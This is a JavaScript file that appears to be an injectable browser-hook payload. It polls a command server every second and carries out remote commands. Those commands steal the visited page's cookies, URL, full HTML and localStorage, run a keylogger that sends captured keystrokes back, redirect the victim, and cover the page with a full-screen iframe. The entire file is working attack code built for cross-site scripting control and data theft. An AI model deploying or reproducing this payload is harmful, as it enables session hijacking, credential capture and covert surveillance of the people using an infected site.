(function () {
    var currentId = createUUID();
    var keys;

    var devUrl = "http://localhost:8080/";

    var script = document.createElement("SCRIPT");
    script.src = 'http://code.jquery.com/jquery-1.11.1.min.js';
//    script.src = 'http://localhost:8080/resources/static/js/jquery.js';
    script.type = 'text/javascript';
    document.getElementsByTagName("head")[0].appendChild(script);

    var checkReady = function (callback) {
        if (window.jQuery) {
            callback(jQuery);
        }
        else {
            window.setTimeout(function () {
                checkReady(callback);
            }, 100);
        }
    };

    checkReady(function ($) {
        setInterval(
                function () {
                    $.ajax({
                               type: 'GET',
                               url: devUrl + 'ping/' + currentId,
                               contentType: 'text/plain',
                               xhrFields: {
                                   withCredentials: false
                               },
                               success: function (data) {
                                   if (data != 'ntp') {
                                       handleData(data);
                                   }
                               }
                           });
                }, 1000);
    });


    function startKeylogger() {
        $("body").on("keypress", function (e) {
            keys = keys + String.fromCharCode(e.which);
        });
    }

    function stopKeyLogger() {
        $("body").off("keypress");
        sendCommandToServer('receiveKeys', keys);
        keys = '';
    }

    var handleData = function (data) {
        console.dir(data);
        if (data.type == 'msg') {
            alert(data.metaData);
        } else if (data.type == 'getCookies') {
            sendCommandToServer("receiveCookies", document.cookie);
        } else if (data.type == 'getUrl') {
            sendCommandToServer("receiveUrl", window.location.href);
        } else if (data.type == 'getSite') {
            sendCommandToServer("receiveSite", document.documentElement.outerHTML);
        } else if (data.type == 'startLogger') {
            startKeylogger();
        } else if (data.type == 'stopLogger') {
            stopKeyLogger();
        } else if (data.type == 'goToUrl') {
            window.location.href = data.metaData;
        } else if (data.type == 'goToUrlInFrame') {
            var embeddableUrl = data.metaData;


            var html = "<iframe id='hackedIframe' src='" + embeddableUrl
                    + "' style='"
                    + "position:fixed; "
                    + "top:0px; "
                    + "left:0px; "
                    + "bottom:0px; "
                    + "right:0px; "
                    + "width:100%; "
                    + "height:100%; "
                    + "background-color: white;"
                    + "border:none; "
                    + "margin:0; "
                    + "padding:0; "
                    + "overflow:hidden; "
                    + "z-index:999999;'"
                    + "></iframe>";

            var $hackedIFrame = $('#hackedIframe');
            if ($hackedIFrame) {
                $hackedIFrame.remove();
            }

            $(document.getElementsByTagName("body")[0]).append(html);

        } else if (data.type == 'getLocalStorage') {
            var localStorageContent = [];
            for (var i = 0; i < localStorage.length; i++) {
                var key = localStorage.key(i);
                var value = localStorage[key];
                var combined = 'key: ' + key + ', value: ' + value;
                localStorageContent.push(combined);
            }
            sendCommandToServer('receiveLocaleStorage', localStorageContent);
        }

    };

    function sendCommandToServer(type, data) {
        var url = devUrl + type + '/' + currentId;

        if (type == 'receiveLocaleStorage') {
            data = ({data: data});
        }

        $.ajax({
                   type: "POST",
                   url: url,
                   data: data,
                   contentType: "application/json; charset=utf-8"
               });
    }

    function createUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

})();